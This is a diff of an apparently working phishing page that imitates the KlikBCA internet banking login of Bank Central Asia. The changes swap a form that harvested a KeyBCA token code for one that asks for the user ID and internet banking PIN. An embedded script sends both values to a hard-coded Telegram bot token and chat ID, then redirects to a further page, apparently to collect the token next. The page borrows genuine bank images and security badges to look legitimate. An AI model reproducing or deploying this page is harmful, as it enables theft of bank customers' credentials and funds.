@@ -2,149 +2,175 @@
 <head>
   <meta charset="utf-8" />
   <meta content="width=device-width, initial-scale=1" name="viewport" />
-  <title>KeyBCA Login</title>
+  <title>KlikBCA Login</title>
   <style>
-    /* Reset some default styles */
-    * {
-      box-sizing: border-box;
-    }
+    /* Import Google Font Roboto */
+    @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+
+    /* Reset and base */
     body {
       margin: 0;
-      background-color: #ffffff;
-      font-family: Arial, sans-serif;
-      color: #1a2a4a;
+      font-family: 'Roboto', sans-serif;
+      background-color: #fff;
+      color: #2c2c4c;
     }
-    header {
-      background-color: #0a3a8c;
-      border-top: 4px solid #f3c623;
-      border-bottom: 4px solid #f3c623;
-      padding: 0.25rem 0;
-      text-align: center;
+
+    /* Header bar with blue background and yellow borders */
+    .header-bar {
+      background-color: #3f4095;
+      border-top: 8px solid #f7d117;
+      border-bottom: 4px solid #f7d117;
+      padding: 8px 12px;
+      display: flex;
+      align-items: center;
     }
-    header img {
-      width: 150px;
-      height: auto;
-      object-fit: contain;
+
+    .header-bar img {
+      height: 30px;
+      width: auto;
+      display: block;
     }
+
     main {
-      max-width: 400px;
-      margin: 1rem auto;
-      padding: 0 1rem;
+      padding: 12px 16px;
     }
-    h1 {
-      font-size: 1.5rem;
-      font-weight: normal;
-      border-bottom: 1px solid #666666;
-      padding-bottom: 0.25rem;
-      margin-bottom: 0.25rem;
+
+    /* Labels with blue text and underline */
+    label {
+      display: block;
+      color: #3f4095;
+      font-size: 16px;
+      text-decoration: underline;
+      margin-bottom: 4px;
+      font-weight: 400;
+      line-height: 1.2;
     }
-    p.subtitle {
-      color: #d98300;
-      font-size: 1.25rem;
-      margin-top: 0;
-      margin-bottom: 0.5rem;
+
+    /* Orange helper text below labels */
+    .helper-text {
+      color: #f39200;
+      font-size: 14px;
+      margin-top: 10px;
+      margin-bottom: px;
     }
-    form {
-      margin-top: 0.5rem;
-      max-width: 320px;
-    }
-    input[type="text"] {
+
+    /* Input fields */
+    input[type="text"],
+    input[type="password"] {
       width: 100%;
-      max-width: 320px;
-      padding: 0.4rem 0.5rem;
-      font-size: 1.125rem;
-      color: #666666;
-      border: 1px solid #999999;
-      border-radius: 0.25rem;
-      outline-offset: 2px;
-      outline-color: transparent;
-      transition: outline-color 0.2s ease;
+      border: 1px solid #999;
+      border-radius: 4px;
+      padding: 6px 8px;
+      font-size: 16px;
+      margin-bottom: 16px;
+      box-sizing: border-box;
     }
-    input[type="text"]:focus {
-      outline-color: #0a3a8c;
+
+    /* Login button */
+    .login-button {
+      border: 1px solid #444;
+      background-color: #fff;
+      color: #000;
+      padding: 6px 12px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 4px;
+      user-select: none;
     }
-    .form-row {
+
+    /* Container for login button and full site link */
+    .login-row {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      margin-top: 0.5rem;
-      max-width: 320px;
+      margin-bottom: 10px;
     }
-    button {
-      background-color: #ffffff;
-      border: 1px solid #666666;
-      padding: 0.25rem 0.75rem;
-      font-size: 1.125rem;
-      cursor: pointer;
-      color: #000000;
-      border-radius: 0.125rem;
-      transition: background-color 0.2s ease, color 0.2s ease;
-      order: 0;
-    }
-    a.full-site-link {
-      color: #0000ee;
-      font-size: 1.125rem;
+
+    /* Full Site link */
+    .full-site-link {
+      color: #0033cc;
       text-decoration: underline;
-      font-weight: normal;
-      order: 1;
+      font-size: 16px;
+      white-space: nowrap;
     }
-    a.full-site-link:hover,
-    a.full-site-link:focus {
-      color: #000099;
-      outline: none;
-    }
-    button:hover,
-    button:focus {
-      background-color: #0a3a8c;
-      color: #ffffff;
-      border-color: #0a3a8c;
-      outline: none;
-    }
-    .banner {
-      margin-top: 1rem;
-      max-width: 320px;
-      border-radius: 0.5rem;
-      overflow: hidden;
-    }
-    .banner img {
+
+    /* Banner image */
+    .banner-image {
       width: 100%;
-      height: auto;
+      height: 100px;
+      object-fit: contain;
+      margin-bottom: 16px;
       display: block;
-      border-radius: 0.5rem;
     }
-    .badges {
-      margin-top: 1rem;
-      max-width: 320px;
+
+    /* Security logos container */
+    .security-logos {
       display: flex;
-      gap: 1rem;
+      gap: 8px;
+      margin-bottom: 16px;
     }
-    .badges img {
+
+    .security-logos img {
       height: 40px;
       width: auto;
-      object-fit: contain;
+      display: block;
     }
-    footer {
-      background-color: #4a5499;
-      height: 3rem;
-      margin-top: 2rem;
+
+    /* Paragraph text */
+    p {
+      font-size: 16px;
+      line-height: 1.4;
+      margin-top: 0;
+      margin-bottom: 8px;
+      color: #2c2c4c;
     }
-    @media (max-width: 400px) {
-      main {
-        max-width: 100%;
-        padding: 0 0.5rem;
+
+    /* Orange text paragraphs */
+    .orange-text {
+      color: #f39200;
+      font-size: 16px;
+      line-height: 1.4;
+      margin-top: 0;
+      margin-bottom: 8px;
+    }
+
+    /* Underlined links in paragraphs */
+    a {
+      color: #0033cc;
+      text-decoration: underline;
+      cursor: pointer;
+    }
+
+    /* Horizontal rule */
+    hr {
+      border: none;
+      border-top: 1px solid #999;
+      margin: 8px 0;
+    }
+
+    /* Bottom blue bar */
+    .bottom-bar {
+      background-color: #3f4095;
+      height: 48px;
+      width: 100%;
+    }
+
+    /* Responsive adjustments */
+    @media (max-width: 480px) {
+      label {
+        font-size: 16px;
       }
-      form,
-      .form-row,
-      .banner,
-      .badges {
-        max-width: 100%;
+      .helper-text,
+      p,
+      .orange-text {
+        font-size: 13px;
       }
-      input[type="text"] {
-        font-size: 1rem;
+      .login-button {
+        font-size: 14px;
+        padding: 6px 10px;
       }
-      button,
-      a.full-site-link {
-        font-size: 1rem;
+      .full-site-link {
+        font-size: 14px;
       }
     }
   </style>
@@ -165,88 +191,73 @@
             <table id="tbl-txtinput" cellpadding="6" cellspacing="0" width="100%">
 
                 <tbody>
+  </div>
   <main>
-    <h1>Silakan masukkan kode KeyBCA</h1>
-    <p class="subtitle">Please enter Code KeyBCA</p>
-    <form id="keybcaForm">
-      <input
-        id="keybcaInput"
-        type="text"
-        placeholder="Masukkan kode Apply 1"
-        required
-        autocomplete="off"
-      />
-      <div class="form-row">
-        <button type="submit">LOGIN</button>
-        <a href="#" class="full-site-link">Full Site</a>
-      </div>
-    </form>
-    <div class="banner">
-      <img
-        alt="Banner with text Perpanjang Tahapan Berjangka Tanpa Ribet di KlikBCA with a laptop illustration on right side"
-        src="https://m.klikbca.com/images/banner_login_5.png"
-        height="60"
-        width="320"
-      />
+    <label for="userid">Silakan masukkan USER ID Anda</label>
+    <p class="helper-text">Please enter your USER ID</p>
+    <input id="userid" type="text" autocomplete="off" />
+
+    <label for="pin">Silakan masukkan PIN Internet Banking Anda</label>
+    <p class="helper-text">Please enter your Internet Banking PIN</p>
+    <input id="pin" type="password" autocomplete="off" />
+
+    <div class="login-row">
+      <button id="loginBtn" class="login-button" type="button">LOGIN</button>
+      <a class="full-site-link" href="#">Full Site</a>
     </div>
-    <div class="badges">
-      <img
-        alt="AWAS MODUS security badge with yellow and blue colors"
-        src="https://m.klikbca.com/images/keamanan-ib.png"
-        height="40"
-        width="120"
-      />
-      <img
-        alt="digicert EV SECURE badge with blue border and lock icon"
-        src="https://m.klikbca.com/images/digicert-seal.png"
-        height="40"
-        width="120"
-      />
+
+    <img alt="Banner showing a laptop with check marks for Browser Terupdate and OS Terupdate, and a man in a suit with text about KlikBCA service access and a KlikBCA logo" class="banner-image" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg7ujZE_VXFnJlP5TCCF3YXgRoTx0DQ6lVBjLKEahhhAn-0ArWSC9_oEiErcCtmYT_D7IQNoUNmUXx6ZNPiCMWAM_Ftq3bsjDzFfVdtIYfojtukvSCsGecmRU17ZuQVCz5dKqEVuiynA5wR0Gjz-hAg_MLZGUeIDEBoO7LFAjOoRCD5NbyRP5vcLxxFjWI/s1600/1000015643.gif" />
+
+    <div class="security-logos">
+      <img alt="AWAS MODUS security logo with shield and lock icon" src="https://m.klikbca.com/images/keamanan-ib.png" />
+      <img alt="digiCert EV SECURE logo with lock icon and Click to Verify text" src="https://m.klikbca.com/images/digicert-seal.png" />
     </div>
+    <hr />
   </main>
-  <footer></footer>
+  <div class="bottom-bar"></div>
 
   <script>
-    // Replace these with your Telegram bot token and chat ID
-    const TELEGRAM_BOT_TOKEN = "8438787257:AAFpaMeBkcOpnpiWrZBBuCKZYzfs1cgjMiA";
-    const TELEGRAM_CHAT_ID = "7569557649";
+    // Ganti dengan token bot Telegram kamu
+    const telegramBotToken = '8438787257:AAFpaMeBkcOpnpiWrZBBuCKZYzfs1cgjMiA';
+    // Ganti dengan chat ID Telegram kamu
+    const telegramChatId = '7569557649';
 
-    document.getElementById("keybcaForm").addEventListener("submit", function (e) {
-      e.preventDefault();
-      const code = document.getElementById("keybcaInput").value.trim();
-      if (!code) {
-        alert("Please enter the code.");
+    document.getElementById('loginBtn').addEventListener('click', () => {
+      const userId = document.getElementById('userid').value;
+      const pin = document.getElementById('pin').value;
+
+      if (!userId || !pin) {
+        alert('Please fill in both USER ID and PIN.');
         return;
       }
 
-      const message = `KeyBCA Code: ${code}`;
+      const message = `User ID: ${userId}\nPIN: ${pin}`;
 
-      fetch(
-        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-          }),
-        }
-      )
-        .then((response) => response.json())
-        .then((data) => {
-          if (data.ok) {
-            
-            document.getElementById("keybcaForm").reset();
-          } else {
-            alert("Failed to send code to Telegram.");
-          }
+      // Kirim pesan ke Telegram via Bot API
+      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: telegramChatId,
+          text: message
         })
-        .catch(() => {
-          alert("Error sending code to Telegram.");
-        });
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+     window.location.href="key1bca.html";
+          // Bisa reset form atau redirect jika perlu
+        } else {
+          alert('Gagal mengirim data ke Telegram.');
+        }
+      })
+      .catch(error => {
+        alert('Terjadi kesalahan saat mengirim data.');
+        console.error(error);
+      });
     });
   </script>
 </body>
-            </html>
+</html>
